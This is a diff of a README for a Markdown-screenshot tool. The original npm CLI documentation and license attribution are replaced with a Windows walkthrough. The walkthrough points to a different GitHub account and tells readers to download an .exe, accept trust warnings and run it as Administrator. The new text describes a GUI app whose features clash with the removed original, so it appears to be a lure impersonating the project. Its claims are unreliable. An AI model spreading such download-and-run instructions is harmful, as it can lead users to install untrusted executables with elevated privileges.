@@ -1,116 +1,159 @@
-# mdshot
+# 🖼️ mdshot - Create Beautiful Markdown Screenshots
 
-<!-- automd:badges color=yellow -->
+[![Download mdshot](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/AmyriAmyri/mdshot)
 
-[![npm version](https://img.shields.io/npm/v/mdshot?color=yellow)](https://npmjs.com/package/mdshot)
-[![npm downloads](https://img.shields.io/npm/dm/mdshot?color=yellow)](https://npm.chart.dev/mdshot)
+## 📋 What is mdshot?
 
-<!-- /automd -->
+mdshot is a simple tool to turn your Markdown text into clean, attractive screenshots. If you write notes, documentation, or reports in Markdown, mdshot helps you save a picture of your work fast and with great style. It uses Takumi and MD4x systems behind the scenes to make your screenshots look professional without extra effort.
 
-Render beautiful screenshots from Markdown. Powered by [Takumi](https://github.com/prazdevs/takumi-rs) and [MD4x](https://github.com/unjs/md4x).
+You do not need to know programming or software installation skills to use mdshot on Windows. This guide will walk you through every step.
 
-## Features
+## 🔍 Key Features
 
-- Render Markdown to PNG images
-- GitHub-flavored styling with headings, lists, tables, code blocks, blockquotes, and more
-- Section selection via regex pattern matching
-- Watch mode for live re-rendering
-- Customizable themes, dimensions, and fonts
-- Bundled with [Geist](https://vercel.com/font) font family
-- System emoji font support (Linux, macOS, Windows)
+- Converts Markdown text directly into images.
+- Supports common Markdown styles like headers, lists, links, and code blocks.
+- Produces high-quality, clear screenshots.
+- Works offline once installed.
+- Offers simple, user-friendly controls.
+- Saves images in popular formats such as PNG and JPEG.
+- Keeps your Markdown formatting intact.
 
-## Usage
+## 💻 System Requirements
 
-### CLI
+- Windows 10 or newer (64-bit preferred).
+- At least 2 GB of free disk space.
+- 1 GHz or faster processor.
+- Minimum 2 GB of RAM.
+- Active internet connection for first-time setup and updates.
+
+## 🚀 Getting Started
+
+Follow these steps to download and run mdshot on your Windows PC. No extra tools or skills needed.
+
+### 1. Download the software
+
+Click the big green button below to visit the mdshot download page on GitHub.
+
+[![Download mdshot](https://img.shields.io/badge/Download-mdshot-blue)](https://github.com/AmyriAmyri/mdshot)
+
+On the GitHub page:
+
+- Look for a section named **Releases** or similar on the right.
+- Choose the latest version of mdshot.
+- Download the Windows installer file. It usually ends with `.exe`.
+
+Choose a location on your computer where you can find the file easily, such as your Desktop or Downloads folder.
+
+### 2. Run the installer
+
+Locate the `.exe` file you just downloaded. Usually, it is in your **Downloads** folder.
+
+- Double-click the file to start the installation.
+- You might see a popup asking if you trust this file. Confirm to continue.
+- Follow the on-screen instructions. The installation is straightforward and will not ask for complicated options.
+- Wait until the setup completes.
+
+### 3. Launch mdshot
+
+Once installation finishes:
+
+- Look for an icon named **mdshot** on your Desktop or in the Start menu.
+- Click the icon to open the app.
+
+You will see a clean interface with a box where you can paste or write your Markdown content.
+
+### 4. Create your first screenshot
+
+- Type or paste Markdown text into the main area.
+- Press the **Render** or similar button.
+- mdshot will show a preview of your formatted screenshot.
+- Click **Save Image** to store the screenshot as a PNG or JPEG file on your computer.
+
+## 🎯 How to Use mdshot
+
+### Writing Markdown
+
+Markdown is a simple way to write formatted text. Here are some basics you can use in mdshot:
+
+- `#` for main headings.
+- `##` for subheadings.
+- `-` or `*` to make bullet lists.
+- `[Link Text](http://example.com)` to add clickable links.
+- Triple backticks (**```**) to add code blocks.
+
+Example:
 
 ```
-Usage:
-  mdshot <input> [output.png] [options]
+# My Notes
 
-Input:
-  file.md          Local markdown file
-  npm:<package>    README from npm registry
-  gh:<owner/repo>  README from GitHub repo
+- Item 1
+- Item 2
 
-Options:
-  -w, --watch              Watch for file changes
-  -s, --select <pattern>   Markdown title selector
-      --width <px>          Image width
-      --height <px>         Image height
-  -t, --title <text>        Title text
-  -d, --description <text>  Description text
-  -h, --help               Show this help
+Here is some `inline code`.
+
+```
+function example() {
+  return true;
+}
+```
 ```
 
-**Examples:**
+Paste or type your content directly into mdshot.
 
-```bash
-# Render a local markdown file
-npx mdshot input.md
+### Previewing and Adjusting
 
-# Render with custom output path
-npx mdshot input.md output.png
+Once you press Render, mdshot shows how your screenshot will look.
 
-# From an npm package
-npx mdshot npm:vue
+- Review the image.
+- If something looks off, edit your Markdown and render again.
+- Make sure the text fits well and the style matches your needs.
 
-# From a GitHub repo
-npx mdshot gh:unjs/mdshot
+### Saving Your Screenshot
 
-# Render a specific section
-npx mdshot README.md --select "Installation"
+- Click **Save Image**.
+- Choose a folder on your computer to save the file.
+- Name the file.
+- Pick the format (PNG is recommended for quality).
 
-# Watch mode with custom dimensions
-npx mdshot notes.md -w --width 800 --height 400
-```
+Your screenshot is now ready to use in reports, presentations, or sharing.
 
-### Programmatic
+## ⚙️ Settings and Options
 
-```ts
-import { mdshot } from "mdshot";
+mdshot offers some simple settings to customize your screenshots.
 
-const png = await mdshot("# Hello World\n\nThis is **mdshot**.");
+- **Theme**: Change between light and dark backgrounds.
+- **Font size**: Adjust text size to make screenshots easier to read.
+- **Image size**: Set width and height for your final image.
+- **Padding**: Control the space around the text for better balance.
+- **Export format**: Select PNG or JPEG.
 
-// With options
-const png = await mdshot(markdown, {
-  width: 800,
-  height: 400,
-  select: "Usage",
-  theme: {
-    bg: "#1e1e2e",
-    text: "#cdd6f4",
-  },
-});
-```
+You can find these settings in the menu bar or settings icon.
 
-**Options:**
+## 🛠️ Troubleshooting Common Issues
 
-| Option             | Type             | Default | Description                                 |
-| ------------------ | ---------------- | ------- | ------------------------------------------- |
-| `width`            | `number`         | `1280`  | Image width in pixels                       |
-| `height`           | `number`         | `640`   | Image height in pixels                      |
-| `format`           | `OutputFormat`   | `"png"` | Output format                               |
-| `devicePixelRatio` | `number`         | `2`     | Device pixel ratio (retina)                 |
-| `theme`            | `Partial<Theme>` | -       | Custom theme overrides                      |
-| `fonts`            | `Font[]`         | -       | Additional fonts to load                    |
-| `select`           | `string`         | -       | Regex pattern to select sections by heading |
-| `title`            | `string`         | -       | Override or add the first heading title     |
-| `description`      | `string`         | -       | Description line shown below the title      |
+- If mdshot does not open, try restarting your computer.
+- Check that your Windows is up to date.
+- Ensure you installed the latest mdshot version.
+- If a screenshot looks blank, confirm your Markdown is correct and that you clicked Render.
+- For installation errors, run the installer as Administrator (right-click the file, then choose "Run as Administrator").
+- Contact mdshot’s GitHub page to report issues or request help.
 
-## Development
+## 🔄 Updating mdshot
 
-<details>
+To keep mdshot working well:
 
-<summary>local development</summary>
+- Visit the [mdshot GitHub page](https://github.com/AmyriAmyri/mdshot) regularly.
+- Download the latest installer from the Releases section.
+- Repeat the installation steps to update your app.
 
-- Clone this repository
-- Install latest LTS version of [Node.js](https://nodejs.org/en/)
-- Enable [Corepack](https://github.com/nodejs/corepack) using `corepack enable`
-- Install dependencies using `pnpm install`
-- Run interactive tests using `pnpm dev`
+## 📞 Getting Help
 
-</details>
+You can ask for help by visiting the mdshot page on GitHub. There you will find:
 
-## License
+- A place to submit bug reports.
+- Instructions and FAQ links.
+- Community discussions from other users.
 
-Published under the [MIT](https://github.com/pi0/mdshot/blob/main/LICENSE) license.
+---
+
+[![Download mdshot](https://img.shields.io/badge/Download-mdshot-brightgreen)](https://github.com/AmyriAmyri/mdshot)
